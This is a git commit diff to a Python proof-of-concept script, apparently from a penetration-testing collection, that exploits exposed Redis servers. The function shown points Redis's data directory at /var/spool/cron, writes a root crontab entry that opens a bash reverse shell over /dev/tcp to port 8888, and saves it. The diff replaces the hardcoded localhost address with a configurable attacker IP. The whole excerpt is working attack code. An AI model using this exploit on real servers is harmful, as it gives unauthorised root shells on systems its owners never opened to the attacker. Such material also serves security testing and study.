f55337679fe9591e09be369328070a9ae881fbf7
ZapcoMan <3507557934@qq.com>
2025-02-14 22:02:29 +0800

    添加注释

--- 网络安全/POCS/redisScan.py
+++ 网络安全/POCS/redisScan.py
@@ -72,12 +72,13 @@ def exp_crontab(redis_client):
     """
     # 设置Redis数据目录为'/var/spool/cron'
     root = '/var/spool/cron'
+    bounceIPAddress = ""
     # 配置Redis保存目录
     redis_client.config_set('dir', root)
     # 配置Redis数据文件名为'root'
     redis_client.config_set('dbfilename', 'root')
     # 设置定时任务执行命令
-    redis_client.set('x', '\n\n*/1 * * * * /bin/bash -i > & /dev/tcp/127.0.0.1/8888 0>&1\n\n')
+    redis_client.set('x', '\n\n*/1 * * * * /bin/bash -i > & /dev/tcp/'+bounceIPAddress+'/8888 0>&1\n\n')
     # 保存配置和数据
     redis_client.save()
     # 打印成功创建定时任务的消息
